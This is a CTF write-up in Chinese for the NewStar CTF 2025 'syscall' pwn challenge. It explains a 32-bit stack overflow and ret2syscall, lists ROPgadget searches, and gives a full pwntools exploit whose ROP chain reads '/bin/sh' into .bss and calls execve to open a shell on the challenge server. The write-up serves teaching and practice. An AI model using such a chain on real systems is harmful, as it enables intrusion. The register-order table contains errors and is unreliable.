---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# syscall

## 分析

程序是静态链接，32 位的。

漏洞点在 `read` 的溢出，并且没有 `canary` 的保护，偏移是 `0x16`

```c
int func()
{
  _BYTE v1[14]; // [esp+6h] [ebp-12h] BYREF

  return read(0, v1, 100);
}
```

在 IDA 中，按 <kbd>⇧ shift</kbd> <kbd>F12</kbd> 查看字符串，发现没有 `/bin/sh` 字符串，程序也没有找到后门函数，因此考虑利用 ret2syscall。

## ret2syscall 介绍

### 系统调用

函数系统调用，指运行在**用户空间**的程序向**操作系统内核**请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态执行。如设备 IO 操作或者进程间通信。

Linux 的系统调用通过 `int 80h`<span data-desc>（32 位）</span> 或 `syscall`<span data-desc>（64位）</span>实现，用系统调用号来区分入口函数。

**应用程序调用系统调用的过程是：**

1. 把系统调用的编号存入 `EAX`；
2. 把函数参数存入其它通用寄存器；
3. 触发 `0x80` 号中断<span data-desc>（`int 0x80`）</span>或 `call syscall`。

#### 系统调用号

可查询[系统调用表](https://blog.csdn.net/winter2121/article/details/119845443)来获取系统调用号，如 32 位程序 `execve()` 的系统调用号位 `0xb`.

#### 参数传递

| 系统  | 顺序                       |
| ---- | -------------------------- |
| 32位 | `eax` → `edx` → `ecx` → `ebx`         |
| 64位 | `rdi` → `rsi` → `rdx` → `rcx` → `r8` → `r9` |

### 具体实现

#### 32位

一般通过调用 `execve("/bin/sh", NULL, NULL)` 来 getshell

```asm
eax: 系统调用号（如0xb）
ebx: "/bin/sh"
ecx: 0
edx: 0
```
##### ROPgadgets工具

```bash
ROPgadget --binary syscall  --only 'pop|ret' | grep 'eax'
ROPgadget --binary syscall  --only 'pop|ret' | grep 'ebx'
ROPgadget --binary syscall  --only 'pop|ret' | grep 'ecx'
ROPgadget --binary syscall  --only 'pop|ret' | grep 'edx' 
ROPgadget --binary syscall  --string '/bin/sh' 
ROPgadget --binary rop --opcode cd80c3
ROPgadget --binary rop --only 'int'
```

## 做题

由于程序没有 `binsh` 字符串，应该先构造一个 `read` 将 `/bin/sh` 写入 `.bss` 段中。

先利用 ROPgadget 查找控制寄存器的值，32 位系统调用号存在 `eax` 中

```python
pop_eax_ret = 0x080b438a
pop_ebx_ret = 0x08049022
pop_ecx_ret = 0x0804985a
pop_edx_ret = 0x0804985c
```

读取 `/bin/sh` 后就可以构造 `execve("/bin/sh",0,0)` 完成利用了；

还有一点要注意的就是，查找 `int 80` 时，使用 `ROPgadget --binary rop --only 'int'` 查找的 `int 80` 后面没有 `ret` 导致 ROP 链进行不下去，可以用 `ROPgadget --binary rop --opcode cd80c3` 查找。

exp：

```python
from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
elf = ELF('./pwn')
io = remote('8.147.134.121',20659)
#io=process('./pwn')
 
offset = 22
 
pop_eax = 0x080b438a
pop_ebx = 0x08049022
pop_ecx = 0x0804985a
pop_edx = 0x0804985c
int_0x80 = 0x08073a00
bss_addr = elf.bss()
 
payload  = cyclic(offset)
payload += p32(pop_eax)+p32(0x3)
payload += p32(pop_edx)+p32(0x20)
payload += p32(pop_ecx)+p32(bss_addr)
payload += p32(pop_ebx)+p32(0)
payload += p32(int_0x80)               #read(0,bss_addr,0x20)
payload += p32(pop_eax)+p32(0xb)
payload += p32(pop_edx)+p32(0)
payload += p32(pop_ecx)+p32(0)
payload += p32(pop_ebx)+p32(bss_addr)
payload += p32(int_0x80)			   #execve("/bin/sh",0,0)
 
io.sendlineafter("pwn it guys!\n",payload)
io.sendline('/bin/sh\x00')
io.interactive()

```

